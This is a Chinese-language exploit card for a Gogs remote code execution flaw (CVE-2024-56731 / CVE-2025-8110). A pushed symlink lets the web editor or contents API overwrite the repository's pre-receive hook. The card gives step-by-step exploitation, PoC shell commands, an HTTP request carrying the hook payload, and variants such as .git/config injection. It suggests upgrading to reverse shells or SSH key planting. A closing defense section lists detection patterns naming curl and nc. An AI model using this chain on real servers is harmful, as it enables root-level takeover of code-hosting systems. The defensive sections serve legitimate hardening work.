---
id: web-golang-gogs-hooks-prereceive-symlink-write-rce
title: Gogs 仓库文件编辑/UpdateRepoFile 跟随符号链接写入 hooks/pre-receive：push 触发钩子 RCE（CVE-2024-56731 / CVE-2025-8110）
type: scenario
domain: web
path: web/golang
technique: gogs-symlink-prereceive-hook-write-rce
aliases:
- Gogs pre-receive RCE
- CVE-2024-56731
- CVE-2025-8110
- Gogs 符号链接 RCE
- pre-receive.symlink
- UpdateRepoFile 符号链接
- Gogs 钩子命令执行
tags:
- go
- gogs
- git
- symlink
- hook
- pre-receive
- file-write
- rce
- cve-2024-56731
- cve-2025-8110
cve:
- CVE-2024-56731
- CVE-2025-8110
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T09:31:08+08:00'
  notes: '已对照原文与11张图核对：CVE-2024-56731 手工链（创建 test13 仓库、ln -s /root/gogs-repositories/test/test13.git/hooks/pre-receive pre-receive.symlink、push、Web 编辑器写入 #!/usr/bin/env bash + id > /tmp/exploit_success、再 push 触发）与图01-05一致；CVE-2025-8110 的 PutContents→UpdateRepoFile 中 filePath=path.Join(localPath,opts.NewTreeName)、os.MkdirAll、os.WriteFile(...,0600) 与图06-08一致，symlink 检查仅在 oldFilePath 为普通文件且 OldTreeName!=NewTreeName 或 IsNewFile 分支，原地更新符号链接可绕过；图09 API PUT 更新 symlink 后 force push，图11 /tmp/exploit_success 内容为 uid=0(root) gid=0(root) groups=0(root)，RCE 已打通。affected_versions：原文只给出调试环境 gogs-0.13.3，未给受影响区间/修复版本，按 brief 已 --clear（原值“0.13.3（原文调试版本）”为目标环境版本，非原文影响声明）。PoC 未本机执行；frontmatter 无 sources/source_url。'
---

## 一句话结论

Gogs 的仓库文件编辑/`UpdateRepoFile` 在写入文件时跟随仓库内的符号链接：攻击者先推送一个指向服务端仓库 `.git/hooks/pre-receive` 的符号链接，再通过 Web 编辑器或 `PUT /api/v1/repos/:owner/:repo/contents/*` 向该链接写入 shell 脚本，脚本会落到真实的 `pre-receive` 钩子上，下一次 `git push` 由 Gogs 服务进程执行，获得服务器命令执行（CVE-2024-56731 / CVE-2025-8110）。

## 原理

- Git 仓库允许 symlink 条目：攻击者在本地仓库执行 `ln -s /path/to/gogs-repositories/<owner>/<repo>.git/hooks/pre-receive pre-receive.symlink`，提交并 push 后，Gogs 仓库工作区里就存在一个指向服务端钩子文件的符号链接。
- Gogs 的文件写入链路没有对“目标路径是符号链接”做拒绝或真实路径校验：
  - Web 编辑器的保存逻辑直接按仓库相对路径打开文件写入，操作系统跟随 symlink，实际写入钩子文件（CVE-2024-56731）；
  - API `PUT /repos/:username/:reponame/contents/*` → `PutContents` → `Repository.UpdateRepoFile`：`filePath := path.Join(localPath, opts.NewTreeName)` 后 `os.MkdirAll`、`os.WriteFile(filePath, []byte(opts.Content), 0600)`；`os.WriteFile` 同样跟随 symlink（CVE-2025-8110）。
- `UpdateRepoFile` 的 symlink 检查是有条件的：只在“旧路径是普通文件且旧/新路径不同”的重命名分支检查 `osutil.IsSymlink(oldFilePath)`，或在 `IsNewFile` 时检查 `filePath`；对“原地更新一个已存在的符号链接”场景，检查被绕过，写入直接落到链接目标。
- 攻击者写入的内容是 `#!/usr/bin/env bash` 加任意命令（如 `id > /tmp/exploit_success`）。Gogs 在每次 push 时都会以服务进程用户执行仓库的 `hooks/pre-receive`，因此写入后紧接着的 `git push`（或 force push）就会触发命令。
- 根因：仓库工作区被视为“用户可控内容区”，但文件写入操作把用户可控路径交给操作系统解析，未区分“仓库内普通文件”和“指向仓库外/.git 内部的符号链接”；Git 钩子本身又是设计上的命令执行点，两者叠加形成完整 RCE。

## 触发条件

- 目标为受影响的 Gogs（原文调试版本 0.13.3；CVE-2024-56731 与 CVE-2025-8110）。
- 攻击者拥有一个可写仓库（普通注册用户自建仓库即可），能 push 符号链接并调用仓库文件编辑/API。
- Gogs 仓库根目录路径可知或可猜（默认配置或错误信息泄露；原文为 `/root/gogs-repositories`）。
- Gogs 未禁止仓库内符号链接，且写入前未做 `EvalSymlinks`/`Lstat` 校验。
- 目标仓库的 `hooks/pre-receive` 可由 Gogs 进程写入（通常由 Gogs 初始化/拥有）。

## 利用步骤

1. 注册/登录 Gogs，创建一个自己的仓库并 clone 到本地。
2. 在本地创建指向服务端钩子的符号链接并 push：
   `ln -s /root/gogs-repositories/<owner>/<repo>.git/hooks/pre-receive pre-receive.symlink`
   `git add pre-receive.symlink && git commit -m exp && git push`
3. 通过 Gogs Web 编辑器打开 `pre-receive.symlink`，或调用 `PUT /api/v1/repos/<owner>/<repo>/contents/pre-receive.symlink`，内容写入：
   `#!/usr/bin/env bash` + 换行 + `id > /tmp/exploit_success`。
4. 服务端写入跟随 symlink，覆盖真实的 `.git/hooks/pre-receive`。
5. 再次 `git push`（可 force push 一个新提交）触发 pre-receive；钩子执行，`/tmp/exploit_success` 出现命令输出。
6. 将命令替换为反弹 shell/写 SSH key 等验证进一步危害；记录 API 请求、钩子内容与执行结果。

## PoC

```bash
# 1. 创建符号链接并推送
ln -s /root/gogs-repositories/test/test13.git/hooks/pre-receive pre-receive.symlink
git add pre-receive.symlink
git commit -m "exp"
git push
```

```http
PUT /api/v1/repos/test/test13/contents/pre-receive.symlink HTTP/1.1
Host: gogs.example:3000
Authorization: token <有仓库写权限的 token>
Content-Type: application/json

{"message":"update","committer":{"name":"test","email":"a@b.com"},"content":"<base64(\"#!/usr/bin/env bash\\nid > /tmp/exploit_success\\n\")>"}
```

```bash
# 2. 触发钩子
git commit --allow-empty -m trigger && git push --force origin master
# 3. 验证
cat /tmp/exploit_success   # uid=0(root) gid=0(root) groups=0(root)
```

原文通过 Web 编辑器保存 `pre-receive.symlink`（内容为 `#!/usr/bin/env bash` + `id > /tmp/exploit_success`），push 后成功写入；CVE-2025-8110 部分用 API `UpdateRepoFile` 完成同样写入，最终 root 权限命令执行截图确认。

## 变体与关联

- 变体：符号链接目标换成 `.git/hooks/post-receive`、`update`、`pre-push` 等其他钩子，触发时机不同但同样执行。
- 变体：通过 `OldTreeName`/`NewTreeName` 重命名场景绕过 symlink 检查，或使用多层相对链接、`..` 组合。
- 变体：CVE-2025-8110 的 `UpdateRepoFile` 还可写 `.git/config` 注入 `core.sshCommand`/`core.fsmonitor`，等待 Git SSH 操作触发；见关联卡。
- 关联：[[web-golang-gogs-updaterepofile-symlink-git-config-rce]]（同一 Gogs `UpdateRepoFile` 符号链接问题，目标为 `.git/config` + `core.sshCommand`，触发依赖后续 Git SSH 操作；本卡目标为 `hooks/pre-receive`，push 即触发，PoC 不同）。
- 关联：[[web-generic-file-upload-gogs-lfs-oid-content-hash-cross-repo-overwrite]]（同产品 Gogs 的另一处仓库内容写入问题）。

## 检测与防御

- 防御：升级到修复 CVE-2024-56731/CVE-2025-8110 的 Gogs 版本；对仓库文件写入路径做 `filepath.EvalSymlinks` 解析并确认真实路径仍在仓库工作区内、且不在 `.git` 内。
- 防御：用 `os.Lstat`/`O_NOFOLLOW` 拒绝符号链接写入；仓库文件保存采用临时文件 + 原子 rename，避免跟随既有链接。
- 防御：禁止或过滤仓库中的符号链接条目；确保 Gogs 进程无法写入自身仓库的 hooks（权限隔离），钩子目录独立受控。
- 检测：仓库中出现指向 `.git/hooks`、`.git/config` 或仓库外路径的 symlink；Web 编辑器/API 对 symlink 路径的 PUT；`hooks/pre-receive` 内容被修改且含脚本；Gogs 进程树出现 `bash`/`sh` 及 `id`、`curl`、`nc` 等子进程。
- 检测：审计 `UpdateRepoFile` 的 symlink 检查分支是否覆盖“原地更新符号链接”场景；对 Gogs 仓库目录做文件完整性监控。
